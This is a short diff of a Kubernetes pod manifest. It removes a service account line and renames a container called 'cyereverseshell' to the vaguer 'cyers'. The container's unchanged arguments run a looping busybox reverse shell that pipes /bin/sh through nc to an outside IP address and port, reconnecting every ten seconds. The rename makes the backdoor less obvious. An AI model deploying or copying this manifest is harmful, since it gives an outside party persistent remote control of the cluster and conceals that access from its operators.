@@ -6,9 +6,8 @@ metadata:
   labels:
     app: nc
 spec:
-  serviceAccountName: cyerspod-sa
   containers:
-  - name: cyereverseshell
+  - name: cyers
     image: busybox
     args: ["/bin/sh", "-c", "while true; do mkfifo /tmp/f; nc 68.183.22.232 4641 < /tmp/f | /bin/sh > /tmp/f 2>&1; sleep 10; done"]
     securityContext:
